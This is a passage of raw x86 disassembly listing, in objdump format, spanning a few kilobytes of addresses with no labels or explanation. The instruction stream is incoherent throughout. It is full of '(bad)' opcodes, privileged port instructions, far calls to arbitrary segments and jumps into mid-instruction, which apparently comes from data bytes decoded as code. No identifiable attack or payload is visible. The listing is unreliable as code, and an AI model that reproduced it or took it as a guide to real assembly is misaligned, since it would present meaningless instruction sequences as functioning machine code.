  42457e:	daa    
  42457f:	out    dx,al
  424580:	cmp    eax,0xf
  424583:	push   ss
  424584:	fsub   DWORD PTR [ecx+edi*4-0x7c]
  424588:	dec    ebp
  424589:	adc    ecx,DWORD PTR [ebx-0x65]
  42458c:	mov    ds:0x36801887,al
  424591:	fst    DWORD PTR [eax-0x23]
  424594:	xchg   ebp,esp
  424596:	retf   
  424597:	xchg   DWORD PTR [ebx],eax
  424599:	int    0xca
  42459b:	movntq QWORD PTR [esi-0x50],mm7
  42459f:	(bad)  
  4245a0:	sbb    dh,BYTE PTR [ecx]
  4245a2:	inc    edi
  4245a3:	mov    al,0xdc
  4245a5:	push   esp
  4245a6:	adc    BYTE PTR [ecx+0x73],0x9a
  4245aa:	pop    DWORD PTR [ecx+0x8e0f]
	...
  4245b8:	add    BYTE PTR [eax],al
  4245ba:	push   cs
  4245bb:	and    BYTE PTR [eax-0x404051c1],cl
  4245c1:	xor    edi,edx
  4245c3:	sub    dh,BYTE PTR [eax+0x6bf243b7]
  4245c9:	or     DWORD PTR [eax-0x3fffe42],edx
  4245cf:	add    DWORD PTR [eax],eax
  4245d1:	add    ch,ch
  4245d3:	or     DWORD PTR [ebx-0x40],edi
  4245d6:	push   cs
  4245d7:	jns    0x4245cf
  4245d9:	mov    esp,0xbaa89bb3
  4245de:	sbb    BYTE PTR [ecx+0x2d],dh
  4245e1:	(bad)  
  4245e2:	fdiv   DWORD PTR [esi+0x16]
  4245e5:	(bad)  
  4245e6:	push   ss
  4245e7:	jno    0x424655
  4245e9:	mov    bh,0xa6
  4245eb:	xor    al,BYTE PTR [ebp+ebx*1+0x2c]
  4245ef:	loope  0x424636
  4245f1:	sbb    edx,DWORD PTR [ebx]
  4245f3:	scas   al,BYTE PTR es:[edi]
  4245f4:	lods   eax,DWORD PTR ds:[esi]
  4245f5:	xchg   ebp,eax
  4245f6:	add    eax,0x9fd7ab55
  4245fb:	jmp    0x424670
  4245fd:	pop    esi
  4245fe:	add    DWORD PTR [ebx],ebp
  424600:	fild   QWORD PTR [edx+0x56921242]
  424606:	dec    esi
  424607:	adc    al,0x3e
  424609:	int3   
  42460a:	hlt    
  42460b:	loopne 0x4245cf
  42460d:	cld    
  42460e:	sub    edi,DWORD PTR [ecx+0x5dec7446]
  424614:	push   ecx
  424615:	int    0x98
  424617:	repz dec DWORD PTR [ebx+esi*1-0x58]
  42461c:	sbb    ebp,edi
  42461e:	xor    eax,0x30e862bd
  424623:	arpl   WORD PTR [edx+0x4f5c7d0],ax
  424629:	cs cmc 
  42462b:	mov    bh,0x7a
  42462d:	mov    eax,ds:0x230ecebf
  424632:	ror    DWORD PTR [ecx],1
  424634:	jle    0x424615
  424636:	repnz push eax
  424638:	call   0xb0a9:0x1310005a
  42463f:	inc    ecx
  424640:	outs   dx,BYTE PTR ds:[esi]
  424641:	push   ebp
  424642:	adc    ch,BYTE PTR [edx]
  424644:	(bad)  
  424645:	cs pop ebx
  424647:	cld    
  424648:	retf   0x2286
  42464b:	xor    bl,BYTE PTR [edi-0x529f5429]
  424651:	mov    ebx,0x65932969
  424656:	pop    es
  424657:	push   esi
  424658:	jle    0x424687
  42465a:	sub    BYTE PTR [edi-0x5555b223],bl
  424660:	in     al,0xbe
  424662:	xchg   esi,eax
  424663:	rcr    DWORD PTR [esi+ebx*2],1
  424666:	js     0x424685
  424668:	mov    esp,0x52574d5a
  42466d:	mov    dl,0x22
  42466f:	xor    ah,BYTE PTR [edi]
  424671:	add    eax,0x6e3304f9
  424676:	dec    esi
  424677:	jno    0x4246b8
  424679:	repnz add ecx,DWORD PTR [eax]
  42467c:	scas   al,BYTE PTR es:[edi]
  42467d:	adc    BYTE PTR [edi+0x2892e5e2],0xa3
  424684:	outs   dx,BYTE PTR ds:[esi]
  424685:	pop    es
  424686:	xor    al,BYTE PTR [ecx+0x409c7570]
  42468c:	repz iret 
  42468e:	or     edi,DWORD PTR [ebp-0x2ce76189]
  424694:	in     eax,dx
  424695:	scas   eax,DWORD PTR es:[edi]
  424696:	mov    edx,0x872afaea
  42469b:	pop    ecx
  42469c:	imul   esp,DWORD PTR ds:[edx+0x5a],0xa714c5a5
  4246a4:	out    0xcf,eax
  4246a6:	jo     0x4246dc
  4246a8:	xor    dl,bl
  4246aa:	jbe    0x424713
  4246ac:	fadd   QWORD PTR [ebx+0x6b8807e4]
  4246b2:	or     al,0x91
  4246b4:	ret    0x829b
  4246b7:	mov    bh,0xed
  4246b9:	push   edi
  4246ba:	mov    BYTE PTR [eax+0x4d],al
  4246bd:	and    esi,esp
  4246bf:	scas   al,BYTE PTR es:[edi]
  4246c0:	or     edi,eax
  4246c2:	ficom  DWORD PTR [ebp+0x3a]
  4246c5:	sub    DWORD PTR fs:[eax],edx
  4246c8:	movlps QWORD PTR [ebp+0x71985af5],xmm3
  4246cf:	xchg   esi,eax
  4246d0:	in     eax,0xaa
  4246d2:	or     DWORD PTR [eax+0x4d],ebp
  4246d5:	xor    BYTE PTR [edx+0x1260d917],al
  4246db:	ins    BYTE PTR es:[edi],dx
  4246dc:	cmp    DWORD PTR [ecx],ecx
  4246de:	hlt    
  4246df:	dec    eax
  4246e0:	(bad)  
  4246e1:	in     eax,dx
  4246e2:	aam    0x57
  4246e4:	sub    esi,edi
  4246e6:	stos   BYTE PTR es:[edi],al
  4246e7:	or     dl,BYTE PTR [ecx-0x7d13d5d4]
  4246ed:	cs enter 0x4584,0x79
  4246f2:	adc    ax,0xf101
  4246f6:	mov    bl,BYTE PTR [eax+0x19]
  4246f9:	test   al,0xdd
  4246fb:	scas   al,BYTE PTR es:[edi]
  4246fc:	jnp    0x424723
  4246fe:	and    esi,DWORD PTR [edi-0x74]
  424701:	xchg   edx,eax
  424702:	cld    
  424703:	out    0xac,al
  424705:	ror    edi,1
  424707:	mov    eax,0xea84de91
  42470c:	stos   BYTE PTR es:[edi],al
  42470d:	shr    BYTE PTR [ecx+0x3a],cl
  424710:	mov    eax,ds:0x8e4a822e
  424715:	test   ch,al
  424717:	stos   DWORD PTR es:[edi],eax
  424718:	lods   al,BYTE PTR ds:[esi]
  424719:	xchg   ebp,eax
  42471a:	mov    ecx,0x88fe621b
  42471f:	call   DWORD PTR [esi-0x25]
  424722:	std    
  424723:	aad    0xcf
  424725:	inc    eax
  424726:	popf   
  424727:	jl     0x4246c0
  424729:	sbb    dl,BYTE PTR [esi-0x35]
  42472c:	int    0xb2
  42472e:	jnp    0x42477c
  424730:	test   eax,0xcdbde9a4
  424735:	fcomp  DWORD PTR [ebx+0x1cab57a6]
  42473b:	aas    
  42473c:	(bad)  
  42473d:	call   0xafcf130b
  424742:	jae    0x42471c
  424744:	and    DWORD PTR [ecx],0x41
  424747:	cmp    BYTE PTR [ebx+0x46],ch
  42474a:	stos   DWORD PTR es:[edi],eax
  42474b:	inc    edx
  42474c:	push   es
  42474d:	loopne 0x4247b9
  42474f:	add    ecx,esp
  424751:	or     esp,DWORD PTR [esi]
  424753:	ss push ebp
  424755:	daa    
  424756:	push   eax
  424757:	xchg   ebx,eax
  424758:	mov    dl,BYTE PTR [esi-0x3f648416]
  42475e:	cmp    eax,0x7014f589
  424763:	fwait
  424764:	mov    es,edi
  424766:	outs   dx,BYTE PTR ds:[esi]
  424767:	sub    eax,0x8f1f3cf9
  42476c:	fbstp  TBYTE PTR [ebx+0x2c65a09f]
  424772:	dec    ebx
  424773:	ja     0x4246f7
  424775:	jb     0x424707
  424777:	pop    es
  424778:	in     al,dx
  424779:	sub    DWORD PTR [eax-0x5a326d2e],0xc4731ec0
  424783:	sbb    DWORD PTR [edx-0x884e3d3],esp
  424789:	ja     0x42478e
  42478b:	cmp    eax,0xa44daf03
  424790:	setbe  BYTE PTR [edi-0x29]
  424794:	data16 aaa 
  424796:	jns    0x4247e1
  424798:	mov    bh,0x69
  42479a:	pop    edi
  42479b:	dec    esi
  42479c:	and    eax,0x5fad6240
  4247a1:	stos   DWORD PTR es:[edi],eax
  4247a2:	les    edi,FWORD PTR [esi]
  4247a4:	xor    eax,0x95d96c85
  4247a9:	mov    dl,0x4d
  4247ab:	es leave 
  4247ad:	inc    edx
  4247ae:	ud0    ebp,esi
  4247b1:	repz dec ecx
  4247b3:	dec    esp
  4247b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247b5:	jo     0x424822
  4247b7:	sbb    al,0x4
  4247b9:	pushf  
  4247ba:	lahf   
  4247bb:	jnp    0x42474e
  4247bd:	sub    edx,DWORD PTR [eax-0x18c3576b]
  4247c3:	push   edx
  4247c4:	inc    esi
  4247c5:	push   ds
  4247c6:	push   ds
  4247c7:	inc    ebx
  4247c8:	adc    al,0x9f
  4247ca:	dec    BYTE PTR [ecx]
  4247cc:	ds jnp 0x4247cf
	...
  4247d7:	add    BYTE PTR [eax],al
  4247d9:	add    BYTE PTR [edi+edi*4+0x63],bl
  4247dd:	push   eax
  4247de:	jecxz  0x4247bc
  4247e0:	jg     0x4247a1
  4247e2:	data16 adc al,0x63
  4247e5:	sbb    al,0xd3
  4247e7:	xchg   edi,eax
  4247e8:	pushf  
  4247e9:	jb     0x424777
  4247eb:	rol    BYTE PTR [ecx],0x0
  4247ee:	cld    
  4247ef:	add    DWORD PTR [eax],eax
  4247f1:	add    BYTE PTR [edx+esi*2],dh
  4247f4:	push   0x62dc84ab
  4247f9:	push   ecx
  4247fa:	aaa    
  4247fb:	in     al,0x40
  4247fd:	mov    ebp,0xc7afc18d
  424802:	pop    es
  424803:	push   esi
  424804:	xor    ecx,DWORD PTR [edi]
  424806:	mov    edx,DWORD PTR [edx]
  424808:	sbb    eax,0xe222db76
  42480d:	and    cl,BYTE PTR [esp+ebx*4+0x6a29f3fa]
  424814:	mov    al,ds:0xbbaa2d8e
  424819:	add    al,0x54
  42481b:	pushf  
  42481c:	int3   
  42481d:	and    al,0x38
  42481f:	aam    0xee
  424821:	sub    eax,0x70b963cf
  424826:	cmp    DWORD PTR [edi-0x4f],ebx
  424829:	cmp    eax,0xcf8cc9d0
  42482e:	inc    ecx
  42482f:	shr    BYTE PTR [edx-0x21],0x97
  424833:	ins    DWORD PTR es:[edi],dx
  424834:	mov    eax,0x2c64038b
  424839:	fimul  WORD PTR [esi+0x70803ade]
  42483f:	sbb    eax,ebp
  424841:	pop    ds
  424842:	mov    al,0x1
  424844:	jnp    0x4247e3
  424846:	in     eax,dx
  424847:	ds jg  0x4248aa
  42484a:	mov    cl,0x27
  42484c:	sub    ebx,DWORD PTR [edx]
  42484e:	mov    ah,0x2
  424850:	not    BYTE PTR [ebx]
  424852:	or     BYTE PTR [esi-0x9],dl
  424855:	inc    ecx
  424856:	jo     0x42486f
  424858:	mov    BYTE PTR [ecx+0x13],dl
  42485b:	hlt    
  42485c:	sub    al,0xdc
  42485e:	inc    esp
  424860:	dec    ecx
  424861:	sahf   
  424862:	cs aas 
  424864:	xlat   BYTE PTR ds:[ebx]
  424865:	ins    BYTE PTR es:[edi],dx
  424866:	cmp    eax,0x2f2c11a0
  42486b:	pop    ss
  42486c:	ret    
  42486d:	jnp    0x424890
  42486f:	sub    al,0x5d
  424871:	cmp    ebp,DWORD PTR es:[ecx+0x60]
  424875:	jp     0x4248cf
  424877:	sub    ch,ah
  424879:	pop    ss
  42487a:	cli    
  42487b:	les    ecx,FWORD PTR [esi+0x234e2f4a]
  424881:	dec    ebx
  424882:	mov    ds:0xae921ae1,al
  424887:	stc    
  424888:	shl    DWORD PTR ds:0x7ee8865d,cl
  42488e:	fs enter 0xefa,0x2c
  424893:	rcl    BYTE PTR [esi],cl
  424895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424896:	sahf   
  424897:	fsubrp st(0),st
  424899:	stos   BYTE PTR es:[edi],al
  42489a:	mov    ch,0xf3
  42489c:	das    
  42489d:	sub    al,0x7d
  42489f:	ins    DWORD PTR es:[edi],dx
  4248a0:	adc    eax,0x72e9ba19
  4248a5:	out    dx,eax
  4248a6:	neg    DWORD PTR [ecx]
  4248a8:	jg     0x4248d0
  4248aa:	jno    0x424871
  4248ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248ad:	jmp    0x3e69b1c7
  4248b2:	push   ss
  4248b3:	dec    ecx
  4248b4:	inc    edx
  4248b5:	shl    DWORD PTR [ecx+edx*8-0x65],1
  4248b9:	sbb    al,0x4b
  4248bb:	fmul   DWORD PTR [ebx-0x6aafb1b1]
  4248c1:	hlt    
  4248c2:	ins    BYTE PTR es:[edi],dx
  4248c3:	inc    esp
  4248c4:	pusha  
  4248c5:	std    
  4248c6:	mov    eax,0x20007748
  4248cb:	jge    0x4248c4
  4248cd:	push   eax
  4248ce:	int3   
  4248cf:	adc    edx,DWORD PTR [ecx-0x6c048073]
  4248d5:	adc    DWORD PTR [eax+0x6036aef2],eax
  4248db:	jecxz  0x4248db
  4248dd:	sbb    bl,bh
  4248df:	out    0x6d,al
  4248e1:	xchg   edx,eax
  4248e2:	scas   al,BYTE PTR es:[edi]
  4248e3:	sub    ch,BYTE PTR [ebx-0x58]
  4248e6:	cmovge ecx,esi
  4248e9:	jns    0x424875
  4248eb:	sti    
  4248ec:	(bad)  
  4248ed:	or     BYTE PTR [eax-0x7d],ch
  4248f0:	sti    
  4248f1:	and    DWORD PTR [ecx-0x21cc8b15],ebx
  4248f7:	xchg   ebp,eax
  4248f8:	mov    ecx,0xb0862a42
  4248fd:	xor    eax,0x908dc98c
  424902:	or     ah,BYTE PTR [eax-0x7ff08d2e]
  424908:	mov    dh,BYTE PTR [ebp-0x71]
  42490b:	inc    ecx
  42490c:	push   eax
  42490d:	dec    edi
  42490e:	jo     0x4248d5
  424910:	fwait
  424911:	push   ebx
  424912:	sub    DWORD PTR [ebx+0x2d],ebp
  424915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424916:	mov    BYTE PTR [edi+eax*1],al
  424919:	gs inc esp
  42491b:	mov    al,ds:0x9f919c75
  424920:	bound  edx,QWORD PTR [esi-0x29]
  424923:	stc    
  424924:	or     dh,BYTE PTR [edx+0x544fb7a1]
  42492a:	xor    eax,0x991c83e8
  42492f:	call   0x79119150
  424934:	daa    
  424935:	cs xor edi,ebp
  424938:	xchg   edi,eax
  424939:	jmp    0x4fcd352c
  42493e:	pop    es
  42493f:	lods   eax,DWORD PTR ds:[esi]
  424940:	mov    esp,0xf64da9ea
  424945:	xor    BYTE PTR [eax+esi*2],0x3f
  424949:	xor    DWORD PTR [eax+0x79b5db0c],ebp
  42494f:	sbb    esp,DWORD PTR [ecx]
  424951:	nop
  424952:	add    al,0x1d
  424954:	inc    esp
  424955:	loope  0x4248f1
  424957:	inc    esi
  424958:	push   ss
  424959:	inc    edi
  42495a:	addr16 aaa 
  42495c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42495d:	mov    ds:0x62eb7e9b,al
  424962:	xor    DWORD PTR [ebp+0x47],0x1a3f0854
  424969:	cwde   
  42496a:	ret    0xaff9
  42496d:	jmp    0x75aca1a8
  424972:	sbb    esi,DWORD PTR [ecx+esi*1-0x15]
  424976:	push   0xeadfe233
  42497b:	std    
  42497c:	mov    gs,WORD PTR [edi]
  42497e:	cld    
  42497f:	pop    ecx
  424980:	jo     0x42497f
  424982:	js     0x424920
  424984:	(bad)  
  424985:	loope  0x4249da
  424987:	sub    dl,BYTE PTR es:[ecx-0x31]
  42498b:	jno    0x424951
  42498d:	mov    WORD PTR [eax-0x60],es
  424990:	ds popf 
  424992:	(bad)  
  424993:	jecxz  0x424941
  424995:	or     DWORD PTR [ecx+0x3c8b7870],ecx
  42499b:	sbb    eax,0xd34e3532
  4249a0:	stos   DWORD PTR es:[edi],eax
  4249a1:	and    BYTE PTR [ecx+eiz*1],cl
  4249a4:	std    
  4249a5:	mov    al,0x5e
  4249a7:	into   
  4249a8:	sbb    cl,BYTE PTR [edi]
  4249aa:	mov    ds:0x1632e73d,eax
  4249af:	popa   
  4249b0:	icebp  
  4249b1:	mov    DWORD PTR [ecx],0x51a45a42
  4249b7:	addr16 clc 
  4249b9:	sbb    eax,eax
  4249bb:	daa    
  4249bc:	out    dx,eax
  4249bd:	add    BYTE PTR ds:0x106d8679,0x76
  4249c4:	and    eax,0x478b8469
  4249c9:	fcomp  DWORD PTR [esi+0x7f203735]
  4249cf:	retf   0x64e9
  4249d2:	xor    eax,0x13fcb563
  4249d7:	aaa    
  4249d8:	cmp    ebp,DWORD PTR [eax+0x62]
  4249db:	adc    dl,BYTE PTR gs:[esi+ebp*1-0x12c29cad]
  4249e3:	dec    edx
  4249e4:	and    al,0x61
  4249e6:	ds (bad) 
  4249e8:	leave  
  4249e9:	(bad)  
  4249ea:	shl    DWORD PTR [edi],cl
  4249ec:	cmc    
  4249ed:	dec    edx
	...
  4249fa:	inc    ebx
  4249fb:	push   ebp
  4249fc:	pusha  
  4249fd:	(bad)  
  4249fe:	jbe    0x4249bf
  424a00:	out    dx,eax
  424a01:	(bad)  
  424a03:	test   al,0x37
  424a05:	stos   DWORD PTR es:[edi],eax
  424a06:	jo     0x424a3e
  424a08:	adc    eax,edx
  424a0a:	mov    dl,al
  424a0c:	add    DWORD PTR [eax],eax
  424a0e:	cld    
  424a0f:	add    DWORD PTR [eax],eax
  424a11:	add    BYTE PTR [edi+0x6bdf789e],dh
  424a17:	in     al,0xe4
  424a19:	sub    al,0xc8
  424a1b:	arpl   WORD PTR [eax],bx
  424a1d:	ret    0x9527
  424a20:	stos   DWORD PTR es:[edi],eax
  424a21:	jae    0x424a76
  424a23:	neg    DWORD PTR [edx+0x6c]
  424a26:	cmc    
  424a27:	repz int 0x6a
  424a2a:	jne    0x4249de
  424a2c:	sbb    ecx,ebx
  424a2e:	mov    ch,0x2e
  424a30:	dec    esp
  424a31:	popf   
  424a32:	ss mov ecx,0x8304ab0
  424a38:	stc    
  424a39:	inc    eax
  424a3a:	outs   dx,DWORD PTR ds:[esi]
  424a3b:	mov    ebx,0x31f6a631
  424a40:	xchg   ebp,eax
  424a41:	imul   edi,DWORD PTR [edi],0x6b4c240a
  424a47:	adc    DWORD PTR [edi-0x25],edi
  424a4a:	pop    ebx
  424a4b:	ja     0x424a6e
  424a4d:	mov    dh,0x7d
  424a4f:	rep outs dx,DWORD PTR ds:[esi]
  424a51:	pop    ebx
  424a52:	out    0x1c,eax
  424a54:	loopne 0x4249f8
  424a56:	(bad)  
  424a57:	and    eax,ecx
  424a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a5a:	rcl    BYTE PTR [ecx-0x1c3a6571],cl
  424a60:	hlt    
  424a61:	or     al,0x7f
  424a63:	hlt    
  424a64:	inc    BYTE PTR [eax]
  424a66:	shl    DWORD PTR [edx-0x6d],1
  424a69:	popa   
  424a6a:	dec    ecx
  424a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a6c:	data16 fsubr st(0),st
  424a6f:	mov    eax,0x9ea2f56a
  424a74:	xchg   esp,eax
  424a75:	push   eax
  424a76:	call   0xd7b5:0x1b7b9d6d
  424a7d:	mov    eax,DWORD PTR [esi]
  424a7f:	sbb    DWORD PTR [edi-0x779a5955],esi
  424a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a86:	and    BYTE PTR [edx+0x71c88f7],dh
  424a8c:	imul   ebp,DWORD PTR [edx+ecx*1+0x6abe3a08],0xbedb4099
  424a97:	ror    eax,cl
  424a99:	push   ebp
  424a9a:	enter  0x6ae9,0x8
  424a9e:	xchg   DWORD PTR [edi-0x7cd4608a],edi
  424aa4:	int3   
  424aa5:	in     al,0x46
  424aa7:	or     BYTE PTR [ebx-0x2c],al
  424aaa:	sbb    BYTE PTR [edi-0xcbd0d46],bh
  424ab0:	pop    ds
  424ab1:	fld    DWORD PTR [edi-0x25d6c9ef]
  424ab7:	fcomp  QWORD PTR [esi-0x21477d44]
  424abd:	scas   eax,DWORD PTR es:[edi]
  424abe:	popf   
  424abf:	sbb    esp,DWORD PTR [ebx+0x57]
  424ac2:	test   al,0x99
  424ac4:	pop    ebx
  424ac5:	dec    ebp
  424ac6:	adc    ch,dl
  424ac8:	mov    ecx,0x7611f185
  424acd:	mov    edi,0xdcf21da4
  424ad2:	test   al,0x7a
  424ad4:	rcr    ecx,cl
  424ad6:	adc    eax,0xf2eab2e7
  424adb:	xchg   ebx,eax
  424adc:	pop    esi
  424add:	shl    DWORD PTR es:[edi-0x1],1
  424ae1:	pop    ecx
  424ae2:	push   edx
  424ae3:	aam    0xaa
  424ae5:	aam    0x8b
  424ae7:	cwde   
  424ae8:	fsubr  DWORD PTR ds:0xaaa91103
  424aee:	lock sbb bl,BYTE PTR [esi-0x2c3a5afe]
  424af5:	add    cl,BYTE PTR [esi+0x4e003c86]
  424afb:	and    esp,ebx
  424afd:	std    
  424afe:	mov    esp,0x36545b84
  424b03:	sub    bh,BYTE PTR [ebx-0x2f7fa5da]
  424b09:	inc    esp
  424b0a:	sub    al,0x3e
  424b0c:	mov    al,0x39
  424b0e:	mov    bh,0x14
  424b10:	cld    
  424b11:	lods   al,BYTE PTR ds:[esi]
  424b12:	jns    0x424b60
  424b14:	xchg   esp,eax
  424b15:	es jnp 0x424b4f
  424b18:	jno    0x424b42
  424b1a:	ja     0x424b65
  424b1c:	xor    edx,DWORD PTR ds:0xaf25e918
  424b22:	sub    edx,ebx
  424b24:	jo     0x424b13
  424b26:	inc    edi
  424b27:	fild   WORD PTR [edi+0x6b]
  424b2a:	imul   ebp,DWORD PTR [edx],0x55
  424b2d:	js     0x424acf
  424b2f:	xchg   esi,eax
  424b30:	leave  
  424b31:	or     DWORD PTR [ecx-0x166d1631],eax
  424b37:	int3   
  424b38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b39:	out    0xed,eax
  424b3b:	out    dx,eax
  424b3c:	retf   
  424b3d:	pop    ebx
  424b3e:	sbb    bh,BYTE PTR [edi+0x1f]
  424b41:	jo     0x424b0b
  424b43:	mov    dh,0x79
  424b45:	scas   al,BYTE PTR es:[edi]
  424b46:	sbb    BYTE PTR [ebp+0x6f44cac0],dl
  424b4c:	fwait
  424b4d:	lea    eax,[ecx+0x46]
  424b50:	fdivr  DWORD PTR [edi-0x286aa925]
  424b56:	mov    bl,0x88
  424b58:	loope  0x424adf
  424b5a:	jecxz  0x424bdb
  424b5c:	mov    edi,0xd7b71de7
  424b61:	fwait
  424b62:	aad    0x4a
  424b64:	retf   
  424b65:	js     0x424ba6
  424b67:	cmp    al,0x6b
  424b69:	out    dx,al
  424b6a:	pop    es
  424b6b:	lds    edx,FWORD PTR [esi-0x59]
  424b6e:	mov    ch,0xfe
  424b70:	jle    0x424b3a
  424b72:	mov    WORD PTR [edi+0x2c],?
  424b75:	das    
  424b76:	lea    esp,[edx]
  424b78:	int    0xba
  424b7a:	sub    al,0xaf
  424b7c:	jge    0x424b7f
  424b7e:	call   0xb0af:0xbb5f49e2
  424b85:	lock push eax
  424b87:	xor    BYTE PTR ds:0x38de0d03,0x8f
  424b8e:	into   
  424b8f:	mov    al,0x9
  424b91:	push   0xbbdcbe6e
  424b96:	xor    ah,bh
  424b98:	mov    esi,0x2960a39a
  424b9d:	mov    ebp,0xf08c19f1
  424ba2:	std    
  424ba3:	hlt    
  424ba4:	loopne 0x424b7c
  424ba6:	mov    ah,0xc2
  424ba8:	mov    DWORD PTR [edi+0x77],0x14914c1d
  424baf:	cs and dh,bl
  424bb2:	cmp    al,0xfa
  424bb4:	cmp    bh,BYTE PTR [ebx]
  424bb6:	pop    ss
  424bb7:	adc    dl,al
  424bb9:	hlt    
  424bba:	in     al,dx
  424bbb:	push   ds
  424bbc:	mov    bh,0x24
  424bbe:	out    dx,al
  424bbf:	or     edx,DWORD PTR [esi-0x27fbb062]
  424bc5:	mov    eax,ds:0xe91de978
  424bca:	mov    esi,0xb745a84e
  424bcf:	xor    BYTE PTR [eax-0x6],bh
  424bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424bd3:	jne    0x424b6d
  424bd5:	call   0xc5df:0xcc0cb719
  424bdc:	push   edx
  424bdd:	jo     0x424bb2
  424bdf:	jmp    0x424c49
  424be1:	adc    eax,0xcc234f8b
  424be6:	push   ebp
  424be7:	push   ebx
  424be8:	cmp    ch,BYTE PTR [eax+0x75]
  424beb:	dec    eax
  424bec:	je     0x424c09
  424bee:	dec    edx
  424bef:	into   
  424bf0:	jmp    0x6746bbb8
  424bf5:	scas   al,BYTE PTR es:[edi]
  424bf6:	nop
  424bf7:	jo     0x424bfb
  424bf9:	and    al,0xc0
  424bfb:	pop    edi
  424bfc:	lea    esi,[ebx-0x6f9e64c1]
  424c02:	lods   eax,DWORD PTR ds:[esi]
  424c03:	sub    edx,DWORD PTR [edi-0x1e7a1e8]
  424c09:	sub    al,0xdd
  424c0b:	cmp    eax,0xde86
	...
  424c18:	add    BYTE PTR [eax],al
  424c1a:	push   edi
  424c1b:	sub    eax,0xba7f9a07
  424c20:	fucomip st,st(5)
  424c22:	addr16 jmp 0xbdf3808f
  424c28:	add    eax,0x1c4847f
  424c2d:	add    ah,bh
  424c2f:	add    DWORD PTR [eax],eax
  424c31:	add    BYTE PTR [eax+ebp*1-0x3c],bl
  424c35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c37:	mov    BYTE PTR [eax+0x39],dl
  424c3a:	adc    bh,cl
  424c3c:	inc    esp
  424c3d:	cld    
  424c3e:	cmp    bl,al
  424c40:	xchg   esp,eax
  424c41:	fwait
  424c42:	jns    0x424c06
  424c44:	mov    cl,0x83
  424c46:	mov    al,ds:0x7a2db86c
  424c4b:	scas   eax,DWORD PTR es:[edi]
  424c4c:	not    BYTE PTR [ecx-0x56]
  424c4f:	cmc    
  424c50:	jl     0x424bd3
  424c52:	sub    ecx,DWORD PTR [edx-0x5a]
  424c55:	mov    esp,0xa07fd977
  424c5a:	sub    BYTE PTR [ebx+0x4d],ch
  424c5d:	(bad)  
  424c5e:	mov    ebx,0x6325e014
  424c63:	adc    edi,ebx
  424c65:	sbb    ah,bh
  424c67:	inc    edi
  424c68:	mov    es,ebp
  424c6a:	xor    ebx,DWORD PTR [edi+0x293bb361]
  424c70:	dec    edi
  424c71:	setl   BYTE PTR [ebx+0x5d]
  424c75:	lahf   
  424c76:	adc    BYTE PTR [ebx],al
  424c78:	adc    eax,0xf23c40f3
  424c7d:	fwait
  424c7e:	icebp  
  424c7f:	out    0x3,al
  424c81:	leave  
  424c82:	ds cwde 
  424c84:	aad    0x5e
  424c86:	lods   eax,DWORD PTR ds:[esi]
  424c87:	dec    ebx
  424c88:	aad    0x12
  424c8a:	lahf   
  424c8b:	aaa    
  424c8c:	shl    BYTE PTR [ebp-0x58],0x31
  424c90:	pop    es
  424c91:	add    eax,0x2e947aca
  424c96:	adc    eax,0x1f1c80d0
  424c9b:	cmp    DWORD PTR [edx],edi
  424c9d:	scas   al,BYTE PTR es:[edi]
  424c9e:	add    eax,0xa23199b
  424ca3:	retf   0x2c5f
  424ca6:	mov    bh,0xb3
  424ca8:	xlat   BYTE PTR ds:[ebx]
  424ca9:	icebp  
  424caa:	icebp  
  424cab:	es xchg edi,eax
  424cad:	mov    edx,0x78b007bd
  424cb2:	inc    ebx
  424cb3:	xor    al,al
  424cb5:	cmp    ah,BYTE PTR [edi+0x6]
  424cb8:	xchg   ebp,eax
  424cb9:	add    DWORD PTR [ebp-0x67],edi
  424cbc:	sahf   
  424cbd:	fisubr WORD PTR [edi+0x4f49c10a]
  424cc3:	lahf   
  424cc4:	push   ebp
  424cc5:	sub    BYTE PTR [ecx],dl
  424cc7:	pusha  
  424cc8:	or     BYTE PTR [edx+0x3c437f14],bh
  424cce:	inc    ebx
  424ccf:	inc    edi
  424cd0:	sahf   
  424cd1:	push   ebp
  424cd2:	or     eax,0xe6704e6d
  424cd7:	and    bh,dh
  424cd9:	adc    ecx,esi
  424cdb:	loope  0x424ca2
  424cdd:	sbb    eax,0xab33488a
  424ce2:	sub    esp,ebp
  424ce4:	das    
  424ce5:	inc    ebx
  424ce6:	push   edi
  424ce7:	imul   edi,DWORD PTR [ecx+0x6534c0ad],0x85f46dc
  424cf1:	jge    0x424c89
  424cf3:	cmp    BYTE PTR [eax-0xd67922f],cl
  424cf9:	mov    al,ds:0x4036e6c1
  424cfe:	gs aas 
  424d00:	repnz mov al,0x8e
  424d03:	clc    
  424d04:	call   0x7dc3:0xa5ac071b
  424d0b:	inc    eax
  424d0c:	mov    ebp,0xb36ab16f
  424d11:	sub    eax,DWORD PTR [ebx-0x293c2e10]
  424d17:	int    0xe9
  424d19:	cmp    eax,ebp
  424d1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d1c:	aaa    
  424d1d:	pop    es
  424d1e:	es jg  0x424d4b
  424d21:	sbb    al,0xfe
  424d23:	loop   0x424cfd
  424d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d26:	sub    eax,0xc1d1528f
  424d2b:	dec    esi
  424d2c:	clc    
  424d2d:	push   ss
  424d2e:	sub    BYTE PTR [edx],ah
  424d30:	push   cs
  424d31:	mov    al,0xb7
  424d33:	xor    ecx,ebx
  424d35:	pop    esi
  424d36:	stos   DWORD PTR es:[edi],eax
  424d37:	xchg   ebp,eax
  424d38:	das    
  424d39:	adc    esp,DWORD PTR [eax+eax*1-0x32]
  424d3d:	push   ss
  424d3e:	fist   DWORD PTR [ebx]
  424d40:	xchg   edx,eax
  424d41:	dec    ecx
  424d42:	shr    ebp,cl
  424d44:	mov    edx,0x6328a692
  424d49:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  424d4b:	sub    eax,0xc515d18a
  424d50:	or     al,al
